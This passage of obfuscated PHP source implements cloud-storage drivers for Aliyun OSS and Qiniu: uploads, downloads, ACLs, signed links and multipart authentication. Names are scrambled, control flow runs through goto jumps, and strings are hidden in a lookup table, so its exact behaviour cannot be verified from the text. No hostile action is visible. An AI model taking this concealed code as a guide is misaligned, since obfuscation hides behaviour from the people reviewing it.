$this->bucketAcl : $F°›¯æ¶; if ($bÜËøĞë¢” == $eø‡ƒ‹‡„ï[1177]) { return $eø‡ƒ‹‡„ï[1176]; } if ($bÜËøĞë¢” == $eø‡ƒ‹‡„ï[1178]) { return $eø‡ƒ‹‡„ï[487]; } goto BÅé„”ŞÕŒ; b§±ù´µ·: } private function chmodPath($cù¶„Ş˜â, $eºñ±µ’‹ = '') { $eô¤£éŞÜã =& $_SERVER[£ü]; $eƒÊå‚‚ = empty($eºñ±µ’‹) ? $eô¤£éŞÜã[1178] : $eºñ±µ’‹; $fî›ÌŒ¶ë = array($eô¤£éŞÜã[34], $eô¤£éŞÜã[182], $eô¤£éŞÜã[1177], $eô¤£éŞÜã[1178]); if (!in_array($eƒÊå‚‚, $fî›ÌŒ¶ë)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($cù¶„Ş˜â), $eƒÊå‚‚); } catch (OSS\Core\OssException $BĞõ˜½ò¨) { return !1; } return !0; } public function getContent($A¼ĞŞ·ßšŠ) { return $this->fileSubstr($A¼ĞŞ·ßšŠ, -1); } public function setContent($f…ˆìáÙçŠ, $d¨Ü‚÷ØºÅ = '') { $bÂ¡°÷õî =& $_SERVER[£ü]; try { $FÒñÈÊÁ„æ = $this->trafficLimit($bÂ¡°÷õî[1179]); $fÜÊ÷×ªù¹ = $this->client->putObject($this->bucket, $this->pathEncode($f…ˆìáÙçŠ), $d¨Ü‚÷ØºÅ, $FÒñÈÊÁ„æ); } catch (OSS\Core\OssException $a¹ëÅ‹œ¸) { return !1; } $D†ïˆë†ø§ = array($bÂ¡°÷õî[1166] => trim($fÜÊ÷×ªù¹[$bÂ¡°÷õî[1180]], $bÂ¡°÷õî[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($f…ˆìáÙçŠ))); $this->updateObjMeta($f…ˆìáÙçŠ, $D†ïˆë†ø§); return isset($fÜÊ÷×ªù¹[$bÂ¡°÷õî[1181]][$bÂ¡°÷õî[1128]]) ? (int) $fÜÊ÷×ªù¹[$bÂ¡°÷õî[1181]][$bÂ¡°÷õî[1128]] : strlen($fÜÊ÷×ªù¹); } private function updateObjMeta($eä·’¼†’§, $e¾è¾¤Şœ‘) { $eä·’¼†’§ = $this->pathEncode($eä·’¼†’§); try { $Dùç´Åâ±Ì = array(OSS\OssClient::OSS_HEADERS => $e¾è¾¤Şœ‘); $this->client->copyObject($this->bucket, $eä·’¼†’§, $this->bucket, $eä·’¼†’§, $Dùç´Åâ±Ì); } catch (OSS\Core\OssException $eöóÄ’¢ø) { return !1; } return !0; } public function upload($BÌŒ‚âİ»Š, $B¡¡™°¨©‰, $DÉàëÉ‚ö­ = false, $Aª¬Û¯ˆÀ‰ = REPEAT_REPLACE) { $Fò“¸¼ñÌ° =& $_SERVER[£ü]; $Bòò†ŞĞ¡¢ = trim($BÌŒ‚âİ»Š, $Fò“¸¼ñÌ°[8]); $aäˆ³„İœë = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => $this->osChunkSize(), OSS\OssClient::OSS_HEADERS => array($Fò“¸¼ñÌ°[1166] => @md5_file($B¡¡™°¨©‰)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($BÌŒ‚âİ»Š))); $aäˆ³„İœë = $this->trafficLimit($Fò“¸¼ñÌ°[1179], $aäˆ³„İœë); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Bòò†ŞĞ¡¢), $B¡¡™°¨©‰, $aäˆ³„İœë); } catch (OSS\Core\OssException $bµ™„î˜¼Ø) { return !1; } return $this->getPathOuter($BÌŒ‚âİ»Š); } public function getHost() { $A‰¡‡¶Æ¹ =& $_SERVER[£ü]; $a‰ŒØôİ³ = explode($A‰¡‡¶Æ¹[168], parent::getHost()); return $a‰ŒØôİ³[0] . $A‰¡‡¶Æ¹[168] . $this->bucket . $A‰¡‡¶Æ¹[93] . $a‰ŒØôİ³[1]; } public function uploadFormData($DäŸä‡äƒ, $d£†éáÀØ· = 3600) { goto eÉï‘éÍâ; a×ê„äÑ‚: $B„…Ï·Ãñõ = date($Fš™«âÁÑ»[1182], time() + $BÒŒµîî…); $cËÚêåÛ‡„ = new DateTime($B„…Ï·Ãñõ); $F£„âïÉ¡ = $cËÚêåÛ‡„->format(DateTime::ISO8601); goto AçèÏÓÎœå; aì¡ñ–Ö²×: return $e¬Ñé ÜÜ‚; goto c¹”ïíí–; CßïŒ˜‚‚è: $fõ­ÛŒïÃ = $this->pathFather($DäŸä‡äƒ); $Cõ°Ëƒ©É¢ = array($Fš™«âÁÑ»[1085] => $F£„âïÉ¡, $Fš™«âÁÑ»[1086] => array(array($Fš™«âÁÑ»[1184], 0, $e»å·¾Ğõ), array($Fš™«âÁÑ»[1089], $Fš™«âÁÑ»[1090], $fõ­ÛŒïÃ))); $bƒ’¨œì = base64_encode(json_encode($Cõ°Ëƒ©É¢)); goto AÕ‰êµ•Ø‡; eÉï‘éÍâ: $Fš™«âÁÑ» =& $_SERVER[£ü]; if (!($Bİªå”ŞÄï = $this->getHost())) { return !1; } $BÒŒµîî… = $d£†éáÀØ·; goto a×ê„äÑ‚; AÕ‰êµ•Ø‡: $b”ŠäÇõ°É = base64_encode(hash_hmac($Fš™«âÁÑ»[215], $bƒ’¨œì, $this->secret, !0)); $e¬Ñé ÜÜ‚ = array($Fš™«âÁÑ»[1095] => $bƒ’¨œì, $Fš™«âÁÑ»[1185] => $this->accessKey, $Fš™«âÁÑ»[1091] => $Fš™«âÁÑ»[1083], $Fš™«âÁÑ»[1186] => $b”ŠäÇõ°É, $Fš™«âÁÑ»[166] => $Bİªå”ŞÄï); $e¬Ñé ÜÜ‚ = $this->trafficLimit($Fš™«âÁÑ»[1179], $e¬Ñé ÜÜ‚); goto aì¡ñ–Ö²×; AçèÏÓÎœå: $bÇ¿µ×ø° = strpos($F£„âïÉ¡, $Fš™«âÁÑ»[281]); $F£„âïÉ¡ = substr($F£„âïÉ¡, 0, $bÇ¿µ×ø°) . $Fš™«âÁÑ»[1183]; $e»å·¾Ğõ = 1048576000 * 5; goto CßïŒ˜‚‚è; c¹”ïíí–: } public function multiUploadFormData($dÙëÙ–æâ, $FÉß×ö±™ = 3600) { $Aºì†‹ê¸¼ =& $_SERVER[£ü]; if (!($cİ£š±ëğ = $this->getHost())) { return !1; } $b¨ˆ¾Ì½Ü† = $this->trafficLimit($Aºì†‹ê¸¼[1179]); $FÖ²Òô»èÈ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($dÙëÙ–æâ), $b¨ˆ¾Ì½Ü†); return array($Aºì†‹ê¸¼[206] => $FÖ²Òô»èÈ, $Aºì†‹ê¸¼[166] => $cİ£š±ëğ . $Aºì†‹ê¸¼[8] . $this->pathEncode($dÙëÙ–æâ), $Aºì†‹ê¸¼[207] => gmdate($Aºì†‹ê¸¼[1187]), $Aºì†‹ê¸¼[89] => $dÙëÙ–æâ); } public function multiUploadAuthData($FßÉò˜¤Ë•, $c¦ —‘®ò = array()) { goto E—ô±Î­ã; E—ô±Î­ã: $Eá§Û¼á¹  =& $_SERVER[£ü]; $B´ÃîŠ§·Í = isset($c¦ —‘®ò[$Eá§Û¼á¹ [207]]) ? $c¦ —‘®ò[$Eá§Û¼á¹ [207]] : gmdate($Eá§Û¼á¹ [1187]); $cÅØ«‹ŒÇ† = isset($c¦ —‘®ò[$Eá§Û¼á¹ [157]]) ? $c¦ —‘®ò[$Eá§Û¼á¹ [157]] : $Eá§Û¼á¹ [33]; goto a“ïÚ¶æ; dˆ˜ëÅ¿Ë: if (!empty($c¦ —‘®ò[$Eá§Û¼á¹ [1189]])) { $DàöÊ˜†½ = array_merge(array($câ‹ŠÒ¤ç‚[4]), $c¦ —‘®ò[$Eá§Û¼á¹ [1189]]); sort($DàöÊ˜†½); $câ‹ŠÒ¤ç‚[4] = implode($Eá§Û¼á¹ [214], $DàöÊ˜†½); } $dì“¸½¦õø = implode($Eá§Û¼á¹ [214], $câ‹ŠÒ¤ç‚); $Cà¾ñÎ™•Ê = base64_encode(hash_hmac($Eá§Û¼á¹ [215], $dì“¸½¦õø, $this->secret, !0)); goto Eâ‰àô¸ó; D…ÍõŸë´Â: $câ‹ŠÒ¤ç‚ = array($Eá§Û¼á¹ [209], $Eá§Û¼á¹ [33], $Eá§Û¼á¹ [116], $B´ÃîŠ§·Í, "\170\x2d\157\163\163\55\x64\x61\164\145\x3a{$B´ÃîŠ§·Í}", $Eá§Û¼á¹ [8] . $this->bucket . $Eá§Û¼á¹ [8] . $AÂì–Ô¶¦ß . $cÅØ«‹ŒÇ†); if (strpos($cÅØ«‹ŒÇ†, $Eá§Û¼á¹ [210]) === 0) { $câ‹ŠÒ¤ç‚[0] = $Eá§Û¼á¹ [211]; if ($d‘¡•™­à = $this->trafficLimit($Eá§Û¼á¹ [1179])) { $AÂì–Ô¶¦ß = $Eá§Û¼á¹ [1188]; array_splice($câ‹ŠÒ¤ç‚, 5, 0, $AÂì–Ô¶¦ß . $Eá§Û¼á¹ [4] . $d‘¡•™­à[$AÂì–Ô¶¦ß]); } } if (isset($c¦ —‘®ò[$Eá§Û¼á¹ [212]]) && $c¦ —‘®ò[$Eá§Û¼á¹ [212]] == $Eá§Û¼á¹ [213]) { $câ‹ŠÒ¤ç‚[0] = $Eá§Û¼á¹ [213]; } goto dˆ˜ëÅ¿Ë; a“ïÚ¶æ: $AÂì–Ô¶¦ß = $FßÉò˜¤Ë•; if (isset($c¦ —‘®ò[$Eá§Û¼á¹ [89]])) { $AÂì–Ô¶¦ß = $c¦ —‘®ò[$Eá§Û¼á¹ [89]]; unset($c¦ —‘®ò[$Eá§Û¼á¹ [89]]); } if (isset($c¦ —‘®ò[$Eá§Û¼á¹ [208]])) { $c¦ —‘®ò[$Eá§Û¼á¹ [207]] = $B´ÃîŠ§·Í; return $this->listUploadParts($AÂì–Ô¶¦ß, $c¦ —‘®ò); } goto D…ÍõŸë´Â; Eâ‰àô¸ó: $a·…„µÇÃ‰ = $Eá§Û¼á¹ [1190] . $this->accessKey . $Eá§Û¼á¹ [4] . $Cà¾ñÎ™•Ê; if (strpos($cÅØ«‹ŒÇ†, $Eá§Û¼á¹ [210]) === 0) { $a·…„µÇÃ‰ = array($Eá§Û¼á¹ [217] => $a·…„µÇÃ‰, $Eá§Û¼á¹ [207] => $B´ÃîŠ§·Í); if ($d‘¡•™­à) { $a·…„µÇÃ‰ = array_merge($a·…„µÇÃ‰, $d‘¡•™­à); } } return $a·…„µÇÃ‰; goto a”Ì¨¤¹Ú…; a”Ì¨¤¹Ú…: } public function listUploadParts($D„øƒ‡²ó, $e»Ş±ºƒ°) { goto C£¾…¤¬ƒˆ; b—¥âœ„éî: unset($e»Ş±ºƒ°[$BïÖïõÆæ[208]], $e»Ş±ºƒ°[$BïÖïõÆæ[212]]); $bÛ ÁŠ‰‡ = $this->multiUploadAuthData($D„øƒ‡²ó, $e»Ş±ºƒ°); if (empty($bÛ ÁŠ‰‡)) { return !1; } goto AÙ§´÷¨ĞÀ; AÙ§´÷¨ĞÀ: return array($BïÖïõÆæ[217] => $bÛ ÁŠ‰‡, $BïÖïõÆæ[207] => $e»Ş±ºƒ°[$BïÖïõÆæ[207]], $BïÖïõÆæ[219] => $càÚìôŸÃƒ); goto Dùô‡«ßĞ; C£¾…¤¬ƒˆ: $BïÖïõÆæ =& $_SERVER[£ü]; $E¸°ìëºŒÙ = parse_url_query($e»Ş±ºƒ°[$BïÖïõÆæ[157]]); $DÚ³î¥â× = $this->client->listParts($this->bucket, $this->pathEncode($D„øƒ‡²ó), $E¸°ìëºŒÙ[$BïÖïõÆæ[206]]); goto EÉ ˆ ·ã; EÉ ˆ ·ã: $b§ÈŒÛÈ„Ÿ = $DÚ³î¥â×->getListPart(); $càÚìôŸÃƒ = array(); foreach ($b§ÈŒÛÈ„Ÿ as $d„Îâ‹¦÷Õ) { $càÚìôŸÃƒ[] = array($BïÖïõÆæ[1170] => $d„Îâ‹¦÷Õ->getPartNumber(), $BïÖïõÆæ[1171] => trim($d„Îâ‹¦÷Õ->getETag(), $BïÖïõÆæ[113])); } goto b—¥âœ„éî; Dùô‡«ßĞ: } public function download($báµ¡‘¢, $Bò«Ù‚ñÛ·) { if ($this->isFolder($báµ¡‘¢)) { return !1; } try { $c°¿—Ñˆ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Bò«Ù‚ñÛ·); $c°¿—Ñˆ = $this->trafficLimit($_SERVER[£ü][105], $c°¿—Ñˆ); $this->client->getObject($this->bucket, $this->pathEncode($báµ¡‘¢), $c°¿—Ñˆ); } catch (OSS\Core\OssException $e‰Œñôí·) { return !1; } return $Bò«Ù‚ñÛ·; } public function fileSubstr($döç¦ÈÊ›ê, $b½³ÆƒÑù = 0, $aÅïï©ƒÅÆ = false) { if ($b½³ÆƒÑù === -1) { $Aô‘±²¾Æ = array(); } else { if ($aÅïï©ƒÅÆ === !1) { $fÏÙ÷œªåƒ = $this->size($döç¦ÈÊ›ê); } else { $fÏÙ÷œªåƒ = $b½³ÆƒÑù + $aÅïï©ƒÅÆ - 1; } $Aô‘±²¾Æ = array(OSS\OssClient::OSS_RANGE => "{$b½³ÆƒÑù}\x2d{$fÏÙ÷œªåƒ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($döç¦ÈÊ›ê), $Aô‘±²¾Æ); } catch (OSS\Core\OssException $bÍÔÛ‡«Â) { think_exception($bÍÔÛ‡«Â->getMessage()); return !1; } } private function trafficLimit($eËè™ÒŠ, $fˆĞÕ§–Î = array()) { goto Eù«³¨¤èŸ; F¼è°Á¹öï: return $fˆĞÕ§–Î; goto aÓàÓ œ¥ï; FË‹Ğ‚ğÜ: if (!$Fæƒˆ¾ºÂ˜) { return $fˆĞÕ§–Î; } $Fæƒˆ¾ºÂ˜ = $Fæƒˆ¾ºÂ˜ < 819200 ? 819200 : ($Fæƒˆ¾ºÂ˜ > 838860800 ? 838860800 : $Fæƒˆ¾ºÂ˜); $fˆĞÕ§–Î[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Fæƒˆ¾ºÂ˜); goto F¼è°Á¹öï; Eù«³¨¤èŸ: $eÖ‰¸ „å =& $_SERVER[£ü]; if ($eËè™ÒŠ == $eÖ‰¸ „å[1179] && $this->isUploadServer() || $eËè™ÒŠ == $eÖ‰¸ „å[105] && $this->isFileOutServer()) { return $fˆĞÕ§–Î; } $Fæƒˆ¾ºÂ˜ = floatval($GLOBALS[$eÖ‰¸ „å[6]][$eÖ‰¸ „å[84]][$eÖ‰¸ „å[91]][$eËè™ÒŠ]) * 1024 * 1024 * 8; goto FË‹Ğ‚ğÜ; aÓàÓ œ¥ï: } public function link($dæÍÓİÕœ, $DØÏ¤™ò¾ = array()) { $e©·ÀÙÙæ =& $_SERVER[£ü]; if (!$this->exist($dæÍÓİÕœ) || $this->isFolder($dæÍÓİÕœ)) { return !1; } try { $DØÏ¤™ò¾ = $this->trafficLimit($e©·ÀÙÙæ[105], $DØÏ¤™ò¾); $eˆ¼¤…å¯¶ = $this->client->signUrl($this->bucket, $this->pathEncode($dæÍÓİÕœ), 3600 * 12, $e©·ÀÙÙæ[213], $DØÏ¤™ò¾); return $this->getCdnLink($eˆ¼¤…å¯¶); } catch (OSS\Core\OssException $dÂ­¸×˜ÃÃ) { return !1; } } public function fileOut($F¶ÜâÏ§¬³, $B‚°°…ƒ¢ = false, $B‡ëœ×Ú”å = false, $d¨ê”Ü¿ñç = '') { goto F¥Ò—˜è©ì; eØÕÒ¾×„³: $Cšµù¤Ó“ = array(OSS\OssClient::OSS_SUB_RESOURCE => $Bæ¶ŸÎËÇ•[1191] . rawurlencode("{$B‚°°…ƒ¢}\x3b\x66\x69\x6c\145\156\x61\x6d\x65\x3d{$B‡ëœ×Ú”å}")); $Cšµù¤Ó“[OSS\OssClient::OSS_SUB_RESOURCE] .= $Bæ¶ŸÎËÇ•[1192] . $cŒé‡ìÖÕª; $f¨¯™‹İ³ = $this->link($F¶ÜâÏ§¬³, $Cšµù¤Ó“); goto f¦õ¹åšŸ; cä¡­Âå»: $cŒé‡ìÖÕª = get_file_mime(get_path_ext($B‡ëœ×Ú”å)); if ($cŒé‡ìÖÕª == $Bæ¶ŸÎËÇ•[198]) { return parent::fileOut($F¶ÜâÏ§¬³, $B‚°°…ƒ¢, $B‡ëœ×Ú”å, $d¨ê”Ü¿ñç); } $B‚°°…ƒ¢ = $B‚°°…ƒ¢ ? $Bæ¶ŸÎËÇ•[199] : $Bæ¶ŸÎËÇ•[200]; goto eØÕÒ¾×„³; f¦õ¹åšŸ: $this->fileOutLink($f¨¯™‹İ³); goto bŠ•äÃÄê; F¥Ò—˜è©ì: $Bæ¶ŸÎËÇ• =& $_SERVER[£ü]; if (!$B‡ëœ×Ú”å) { $B‡ëœ×Ú”å = $this->pathThis($F¶ÜâÏ§¬³); } $B‡ëœ×Ú”å = rawurlencode($B‡ëœ×Ú”å); goto cä¡­Âå»; bŠ•äÃÄê: } public function fileOutServer($aÌÒ¶ÔÄ¯Á, $eš“ëğã¬§ = false, $Aò…²Çß†¢ = false, $fœíÁ´˜ôß = '') { parent::fileOut($aÌÒ¶ÔÄ¯Á, $eš“ëğã¬§, $Aò…²Çß†¢, $fœíÁ´˜ôß); } public function fileOutImage($E³Š‚Õ–÷œ, $bå…´Ó¦Ø = 250) { $F¾ƒˆÔÖÁé = array(OSS\OssClient::OSS_PROCESS => $_SERVER[£ü][1193] . $bå…´Ó¦Ø); $aÖ—Í¯¸“œ = $this->link($E³Š‚Õ–÷œ, $F¾ƒˆÔÖÁé); $this->fileOutLink($aÖ—Í¯¸“œ); } public function fileOutImageServer($e´Ÿ‡êÍÍ, $A‘”¾È´Â§ = 250) { parent::fileOutImage($e´Ÿ‡êÍÍ, $A‘”¾È´Â§); } public function fileOutLink($aæ‚­£“†) { $dÍÁ˜—îÔ¡ =& $_SERVER[£ü]; if (!$this->isCdnHost() && substr($aæ‚­£“†, 0, 7) == $dÍÁ˜—îÔ¡[1098]) { $aæ‚­£“† = $dÍÁ˜—îÔ¡[1099] . substr($aæ‚­£“†, 7); } header($dÍÁ˜—îÔ¡[153] . $aæ‚­£“†); die; } public function hashMd5($FâšÙñ±ÈÍ, $DÊ»³ÚÓ¤İ = '') { $d‚åÉ²÷´Ä =& $_SERVER[£ü]; $F¶Ş˜ìÅ¬¤ = $this->objectMeta($FâšÙñ±ÈÍ); if (!$F¶Ş˜ìÅ¬¤) { return $d‚åÉ²÷´Ä[33]; } if (!isset($F¶Ş˜ìÅ¬¤[$d‚åÉ²÷´Ä[1166]]) && !empty($DÊ»³ÚÓ¤İ)) { $aêóÈÄÅå‘ = $this->updateObjMeta($FâšÙñ±ÈÍ, array($d‚åÉ²÷´Ä[1166] => $DÊ»³ÚÓ¤İ)); $F¶Ş˜ìÅ¬¤[$d‚åÉ²÷´Ä[1166]] = $aêóÈÄÅå‘ ? $DÊ»³ÚÓ¤İ : $d‚åÉ²÷´Ä[33]; } return isset($F¶Ş˜ìÅ¬¤[$d‚åÉ²÷´Ä[1166]]) ? strtolower($F¶Ş˜ìÅ¬¤[$d‚åÉ²÷´Ä[1166]]) : $d‚åÉ²÷´Ä[33]; } public function size($DËöèòÃšˆ) { $E´‚åÒŒÜÄ = $this->objectMeta($DËöèòÃšˆ); return $E´‚åÒŒÜÄ ? $E´‚åÒŒÜÄ[$_SERVER[£ü][77]] : 0; } public function info($Dˆİñğ¶Ö) { if ($this->isFolder($Dˆİñğ¶Ö)) { return $this->folderInfo($Dˆİñğ¶Ö); } else { if ($this->isFile($Dˆİñğ¶Ö)) { return $this->fileInfo($Dˆİñğ¶Ö); } } return !1; } public function exist($B¬èŸòğ„) { return $this->isFile($B¬èŸòğ„) || $this->isFolder($B¬èŸòğ„); } public function isFile($a·ŞÔ«Òæó) { return !$this->isFolder($a·ŞÔ«Òæó) && $this->objectMeta($a·ŞÔ«Òæó); } public function isFolder($aËÇ´İÀ) { return $this->cacheMethod($_SERVER[£ü][220], $aËÇ´İÀ); } protected function objectMeta($b¬äÏö‹Š) { return $this->cacheMethod($_SERVER[£ü][221], $b¬äÏö‹Š); } protected function _objectMeta($FöØ—•¨ë) { $AòÚ¸¨ÖÀ =& $_SERVER[£ü]; try { $eî£Ëœ«Â¬ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($FöØ—•¨ë)); } catch (OSS\Core\OssException $EÆ„Æ¶Î‰˜) { $eî£Ëœ«Â¬ = !1; } if ($eî£Ëœ«Â¬) { $eî£Ëœ«Â¬[$AòÚ¸¨ÖÀ[77]] = intval($eî£Ëœ«Â¬[$AòÚ¸¨ÖÀ[1173]]); } return $eî£Ëœ«Â¬; } protected function _isFolder($a‘ğ–‡‰È‘) { $E”óØ¸“´ =& $_SERVER[£ü]; if ($a‘ğ–‡‰È‘ == $E”óØ¸“´[33] || $a‘ğ–‡‰È‘ == $E”óØ¸“´[8]) { return !0; } $F§áñ•­¤  = array($E”óØ¸“´[1163] => $E”óØ¸“´[8], $E”óØ¸“´[183] => rtrim($a‘ğ–‡‰È‘, $E”óØ¸“´[8]) . $E”óØ¸“´[8], $E”óØ¸“´[1164] => 1, $E”óØ¸“´[1165] => $E”óØ¸“´[33]); $fµÖ£â†ß½ = $this->client->listObjects($this->bucket, $F§áñ•­¤ ); if ($fµÖ£â†ß½->getObjectList() || $fµÖ£â†ß½->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($fÔ¢õèœà) { parent::__construct(); require_once SDK_DIR . $_SERVER[£ü][1194]; $this->_init($fÔ¢õèœà); } public function _init($b¢’«½¡ÕÌ) { foreach ($b¢’«½¡ÕÌ as $E™¹ºÄ®ù÷ => $C»ƒîõ¸) { if (isset($this->{$E™¹ºÄ®ù÷})) { $this->{$E™¹ºÄ®ù÷} = $C»ƒîõ¸; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[£ü][1195], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($F¨Š§¬•¨, $cŒãŸãƒïô = '', $dÉáÓè ‡ = REPEAT_RENAME) { if ($this->setContent($F¨Š§¬•¨, $cŒãŸãƒïô)) { return $this->getPathOuter($F¨Š§¬•¨); } return !1; } public function mkdir($CÌÅë¶Îµª, $f†Î“êöé¤ = REPEAT_SKIP) { goto F†çãÄÍÓ; Aæ™Æö¨õŒ: if (!$this->mkfile($fêåÑ¾å¡‚)) { return !1; } if (!$this->moveFile($fêåÑ¾å¡‚, $CÌÅë¶Îµª)) { $this->delFile($fêåÑ¾å¡‚); return !1; } return $this->getPathOuter($eÛù–í¾«); goto eØä®¿ø„Î; CÄ²¯ç–é: $CÌÅë¶Îµª = $eÛù–í¾« . $Dñ¸ç¶ÁÖ[8]; $Cæ·¸¢²æ† = get_path_this($eÛù–í¾«); $fêåÑ¾å¡‚ = $CÌÅë¶Îµª . $Cæ·¸¢²æ†; goto Aæ™Æö¨õŒ; F†çãÄÍÓ: $Dñ¸ç¶ÁÖ =& $_SERVER[£ü]; $eÛù–í¾« = trim($CÌÅë¶Îµª, $Dñ¸ç¶ÁÖ[8]); if ($this->_isFolder($eÛù–í¾«)) { return $this->getPathOuter($eÛù–í¾«); } goto CÄ²¯ç–é; eØä®¿ø„Î: } public function copyFile($FÃå»ñç‰ç, $B—˜ù‰‚™¸) { $fˆŠà‚èÛò = $this->bucketManager->copy($this->bucket, $FÃå»ñç‰ç, $this->bucket, $B—˜ù‰‚™¸, !0); return $fˆŠà‚èÛò ? !1 : !0; } public function moveFile($B›ŒÈ·—İ, $E‹‡¾Ë¾ÛÙ) { $Añ¬ˆù®­Ä = $this->bucketManager->move($this->bucket, $B›ŒÈ·—İ, $this->bucket, $E‹‡¾Ë¾ÛÙ, !0); return $Añ¬ˆù®­Ä ? !1 : !0; } public function delFile($A§©«¬ÖÒ—) { $fÏ¾Ûá´—° = $this->bucketManager->delete($this->bucket, $A§©«¬ÖÒ—); return $fÏ¾Ûá´—° ? !1 : !0; } public function delFolder($b¿¯Ğºä«½) { $cå÷®·Ì¦Ò = $this->fileList($b¿¯Ğºä«½); if (empty($cå÷®·Ì¦Ò)) { return !0; } $C›ğ¤èÊ’ = 1000; if (count($cå÷®·Ì¦Ò) <= $C›ğ¤èÊ’) { return $this->qnDelObj($cå÷®·Ì¦Ò) ? !1 : !0; } foreach (array_chunk($cå÷®·Ì¦Ò, $C›ğ¤èÊ’) as $dÔØãƒ¼²Î) { $fö‰Š‰¿ó = $this->qnDelObj($dÔØãƒ¼²Î); if ($fö‰Š‰¿ó) { return !1; } } return !0; } private function qnDelObj($DÅ¢š£®äè) { $B§Ÿè—ËÌˆ = $this->bucketManager->buildBatchDelete($this->bucket, $DÅ¢š£®äè); list($F£Ğä’÷, $dÒºùƒÀæ) = $this->bucketManager->batch($B§Ÿè—ËÌˆ); return $dÒºùƒÀæ; } private function fileList($D¾ˆ½È±ˆÏ, $Bµ…˜Í¥ºŒ = 0) { goto d”İç‚ÖÕÊ; C¹ùí‰ŠÛ…: $fÙ¹•†…Õ§ = array(); while (!0) { list($cËÖ­äŒÆ·, $cÉ³‹­ãî) = $this->bucketManager->listFiles($this->bucket, $Fí®‰›…Îº, $D¨¡ºÙì, $D¤ªò•Ìºƒ, $D§¨ÕÖö); if ($cÉ³‹­ãî) { return !1; } $D¨¡ºÙì = array_key_exists($e°ğµ±Ù‰Ò[1165], $cËÖ­äŒÆ·) ? $D¨¡ºÙì = $cËÖ­äŒÆ·[$e°ğµ±Ù‰Ò[1196]] : $e°ğµ±Ù‰Ò[33]; foreach ($cËÖ­äŒÆ·[$e°ğµ±Ù‰Ò[1197]] as $dŒõÁÎ£°) { $f•Ì èæÎ£ = $dŒõÁÎ£°[$e°ğµ±Ù‰Ò[89]]; if ($Bµ…˜Í¥ºŒ) { $f•Ì èæÎ£ = array($e°ğµ±Ù‰Ò[28] => $f•Ì èæÎ£, $e°ğµ±Ù‰Ò[77] => $dŒõÁÎ£°[$e°ğµ±Ù‰Ò[1198]]); } $fÙ¹•†…Õ§[] = $f•Ì èæÎ£; } if ($D¨¡ºÙì == $e°ğµ±Ù‰Ò[33]) { break; } } return $fÙ¹•†…Õ§; goto aºè”Ùìª; a•§§æ¬Ö•: $D¨¡ºÙì = $e°ğµ±Ù‰Ò[33]; $D¤ªò•Ìºƒ = 1000; $D§¨ÕÖö = $e°ğµ±Ù‰Ò[33]; goto C¹ùí‰ŠÛ…; d”İç‚ÖÕÊ: $e°ğµ±Ù‰Ò =& $_SERVER[£ü]; $D¾ˆ½È±ˆÏ = trim($D¾ˆ½È±ˆÏ, $e°ğµ±Ù‰Ò[8]); $Fí®‰›…Îº = empty($D¾ˆ½È±ˆÏ) ? $e°ğµ±Ù‰Ò[33] : $D¾ˆ½È±ˆÏ . $e°ğµ±Ù‰Ò[8]; goto a•§§æ¬Ö•; aºè”Ùìª: } public function rename($E¦¼¾ğõ»Å, $c´îâå¦˜) { return $this->renameObject($E¦¼¾ğõ»Å, $c´îâå¦˜); } public function fileInfo($Eõøó¶²è¢, $aË¯ôâøÀ = false, $Cß»‘âÜ = array()) { goto f™ç÷ºœ–; f™ç÷ºœ–: $cğã§İ•ˆ =& $_SERVER[£ü]; if ($aË¯ôâøÀ) { return array($cğã§İ•ˆ[28] => $this->pathThis($Eõøó¶²è¢), $cğã§İ•ˆ[75] => $this->getPathOuter($cğã§İ•ˆ[8] . $Eõøó¶²è¢), $cğã§İ•ˆ[29] => $cğã§İ•ˆ[164], $cğã§İ•ˆ[77] => isset($Cß»‘âÜ[$cğã§İ•ˆ[1198]]) ? $Cß»‘âÜ[$cğã§İ•ˆ[1198]] : 0, $cğã§İ•ˆ[157] => $this->ext($Eõøó¶²è¢)); } $b›†â²ÒÇ« = array($cğã§İ•ˆ[28] => $this->pathThis($Eõøó¶²è¢), $cğã§İ•ˆ[75] => $this->getPathOuter($cğã§İ•ˆ[8] . $Eõøó¶²è¢), $cğã§İ•ˆ[29] => $cğã§İ•ˆ[164], $cğã§İ•ˆ[184] => 0, $cğã§İ•ˆ[107] => 0, $cğã§İ•ˆ[77] => 0, $cğã§İ•ˆ[157] => $this->ext($Eõøó¶²è¢), $cğã§İ•ˆ[185] => !0, $cğã§İ•ˆ[186] => !0); goto CÈ¹Äõ‹Öó; CÈ¹Äõ‹Öó: if (empty($Cß»‘âÜ)) { $Cß»‘âÜ = $this->objectMeta($Eõøó¶²è¢); if (!$Cß»‘âÜ) { return $b›†â²ÒÇ«; } } if (isset($Cß»‘âÜ[$cğã§İ•ˆ[1199]])) { $b›†â²ÒÇ«[$cğã§İ•ˆ[184]] = $Cß»‘âÜ[$cğã§İ•ˆ[1199]]; } if (isset($Cß»‘âÜ[$cğã§İ•ˆ[1198]])) { $b›†â²ÒÇ«[$cğã§İ•ˆ[77]] = $Cß»‘âÜ[$cğã§İ•ˆ[1198]]; } goto bÚ‹Šˆô‘’; bÚ‹Šˆô‘’: return $b›†â²ÒÇ«; goto CšœíµÚ˜; CšœíµÚ˜: } public function folderInfo($EÏ•ç©‰‘Ç, $CèçöÈˆ­Á = false) { goto b£ŸëêËù; 